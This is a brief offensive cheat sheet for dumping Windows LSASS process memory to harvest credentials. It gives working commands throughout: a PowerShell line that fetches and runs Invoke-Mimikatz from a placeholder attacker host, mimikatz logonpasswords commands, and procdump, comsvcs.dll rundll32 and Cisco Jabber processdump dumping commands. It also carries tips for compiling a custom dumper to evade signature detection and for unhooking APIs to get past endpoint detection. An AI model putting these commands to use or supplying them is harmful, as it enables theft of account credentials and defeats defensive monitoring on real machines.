# LSASS Credential Dumping

## Mimikatz (In-Memory)
```powershell
# Remote download + execute
IEX (New-Object Net.Webclient).DownloadString('http://ATTACKER/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
# Direct mimikatz
sekurlsa::logonpasswords
```

## Task Manager
- Right-click lsass.exe > Create Dump File (requires admin)
- Load dump offline: `sekurlsa::minidump lsass.DMP` then `sekurlsa::logonpasswords`

## Procdump (Sysinternals)
```cmd
procdump.exe -accepteula -ma lsass.exe lsass.dmp
procdump.exe -accepteula -r -ma lsass.exe lsass.dmp   # clone to avoid direct read
```

## comsvcs.dll (LOLBin)
```cmd
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\temp\lsass.dmp full
```

## MiniDumpWriteDump (Custom C++)
- Use `OpenProcess` + `MiniDumpWriteDump` API to dump lsass
- Compile custom dumper to evade signature-based detection
- Link against `dbghelp.lib`

## Cisco Jabber ProcessDump
```powershell
cd "C:\Program Files (x86)\Cisco Systems\Cisco Jabber\x64"
processdump.exe (ps lsass).id c:\temp\lsass.dmp
```

## Notes
- All methods require local admin / SeDebugPrivilege
- Consider API unhooking to bypass EDR hooks on MiniDumpWriteDump
